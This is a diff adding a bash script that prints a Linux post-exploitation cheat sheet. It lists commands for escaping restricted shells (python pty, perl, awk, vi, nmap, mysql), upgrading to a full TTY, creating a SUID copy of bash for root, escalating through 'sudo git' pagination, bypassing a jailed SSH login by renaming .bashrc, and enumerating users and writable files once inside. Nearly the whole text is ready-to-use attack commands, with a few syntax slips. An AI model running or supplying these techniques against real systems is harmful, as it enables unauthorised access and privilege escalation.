@@ -1,0 +1,89 @@
+#!/bin/bash
+echo '[BREAK OUT]'
+echo 'Using python'
+
+echo "python -c 'import pty; pty.spawn(\"/bin/sh\")'"
+echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+echo "echo 'os.system(\"/bin/bash\")'"
+echo '/bin/sh -i'
+echo '/bin/bash -i'
+echo "perl -e 'exec \"/bin/sh\";'"
+echo """:!bash		--> in vi"""
+echo "awk 'BEGIN {system(\"/bin/sh -i\")}'"
+echo "awk 'BEGIN {system(\"/bin/bash -i\")}'"
+echo "nmap --->  --interactive"
+echo "ed"
+echo "!sh"
+echo """
+Spawn a TTY shell from an interpreter
+
+/bin/sh -i
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c \"__import__('pty').spawn('/bin/bash')\"
+python3 -c \"__import__('subprocess').call(['/bin/bash'])\"
+perl -e 'exec \"/bin/sh\";'
+perl: exec \"/bin/sh\";
+perl -e 'print \`/bin/bash\`'
+ruby: exec \"/bin/sh\"
+lua: os.execute('/bin/sh')
+vi: :\!bash
+vi: :set shell=/bin/bash:shell
+nmap: \!sh
+mysql: ! bash  """
+
+echo """
+"""
+echo "[INTERESTING]"
+
+echo "sh -c 'cp \$(which bash) .; chmod +s ./bash'"
+echo "sh -c 'cp \$(which bash) /tmp; chmod +s /tmp/bash'"
+echo "./bash -p"
+echo "========================================================================="
+echo "sudo git -p --help"
+echo "!/bin/bash"	//pagination root priviledge escalation
+echo "========================================================================="
+echo """ From Within Vi
+:set shell=/bin/sh
+:shell
+
+From within IRB
+exec '/bin/sh'
+
+awk ---> find / -exec \$(which awk) 'BEGIN {system(\"/bin/sh -i\")}' \\;
+================================================================================
+==========JAILED SSH SHELL? TRY THIS============================================
+Initial Shell /bin/sh
+If bash is blocked
+check the 'env' variable!
+Linux will default to /bin/bash default bashrc if there is no present .bashrc 
+file in a user's home directory. Legit Shell .......)
+
+1. ssh sara@127.0.0.1 \"/bin/sh\"
+2. cd \$HOME
+3. mv .bashrc .bashrc.BAK 	//( yes it's fucking worked)
+4. exit
+5. ssh sara@127.0.0.1
+================================================================================
+[+ AND EXPORT PATH]
+python -c 'import pty; pty.spawn(\"/bin/bash\")'
+python3 -c 'import pty; pty.spawn(\"/bin/bash\")'
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+export TERM=xterm-256color
+export TERM=linux
+alias ll='clear; ls -lsaht --color=auto'
+CTRL + Z [BACKGROUND PROCESS]
+stty raw -echo ; fg ; reset;
+stty columns 200 rows 200
+================================================================================
+===== Once Broken Out - Before PrivEsc - Perform These Commands ================
+================================================================================
+find / -perm 2 ! -type l ls 2>/dev/null | sort -r
+--------------------------------------------------------------------------------
+grep -vE \"nologin|false\" /etc/passwd
+--------------------------------------------------------------------------------
+find /home -printf \"%f\t%p\t%u\t%g\t%m\n\" 2>/dev/null | column -t
+======= Other, MISC ============================================================
+nmap --interactive
+nmap> !sh
+================================================================================"""
+
